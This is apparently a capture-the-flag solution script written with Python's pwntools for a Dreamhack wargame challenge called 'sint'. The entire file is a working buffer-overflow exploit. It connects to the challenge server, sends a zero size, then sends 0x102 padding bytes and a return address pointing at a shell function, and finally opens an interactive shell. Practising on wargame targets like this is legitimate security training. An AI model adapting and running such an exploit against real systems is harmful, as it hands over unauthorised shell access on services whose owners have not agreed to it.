from pwn import *
context.update(log_level='debug')

p = remote('host1.dreamhack.games', 8574)
#p = process('sint')
addr_shell = 0x8048659

p.recvrepeat(1)

p.sendline('0')

#raw_input('debug:' + str(p.pid))
p.sendlineafter(':', 'a'*0x102 + p32(addr_shell))
p.interactive()

